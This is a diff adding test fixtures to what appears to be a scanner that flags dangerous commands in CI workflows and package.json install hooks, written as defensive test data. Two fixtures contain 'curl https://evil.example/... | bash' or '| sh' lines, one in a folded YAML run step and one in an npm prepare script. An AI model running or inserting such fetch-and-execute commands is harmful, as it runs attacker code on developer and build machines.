@@ -272,6 +272,44 @@ file_path = "package.json"
 expected_action = "allow"
 expected_rules = []
 
+# R1 repo-0082/0083 — folded YAML is scanned after scalar resolution and npm
+# prepare is checked with the same dangerous-command classifier as other hooks.
+[[fixture]]
+name = "workflow_folded_scalar_curl_pipe_shell"
+min_milestone = 13
+input = "jobs:\n  build:\n    steps:\n      - run: >\n          curl https://evil.example/payload.sh\n          | bash\n"
+context = "file"
+file_path = ".github/workflows/folded.yml"
+expected_action = "block"
+expected_rules = ["workflow_curl_pipe_shell"]
+
+[[fixture]]
+name = "workflow_literal_scalar_separate_lines_clean"
+min_milestone = 13
+input = "jobs:\n  build:\n    steps:\n      - run: |\n          curl https://example.test/payload.sh\n          | bash\n"
+context = "file"
+file_path = ".github/workflows/literal.yml"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "package_json_prepare_curl_pipe"
+min_milestone = 13
+input = '{"name":"pkg","scripts":{"prepare":"curl https://evil.example/payload | sh"}}'
+context = "file"
+file_path = "package.json"
+expected_action = "block"
+expected_rules = ["package_script_dangerous"]
+
+[[fixture]]
+name = "package_json_prepare_husky_clean"
+min_milestone = 13
+input = '{"name":"pkg","scripts":{"prepare":"husky install"}}'
+context = "file"
+file_path = "package.json"
+expected_action = "allow"
+expected_rules = []
+
 [[fixture]]
 name = "package_json_no_install_hooks_clean"
 min_milestone = 3
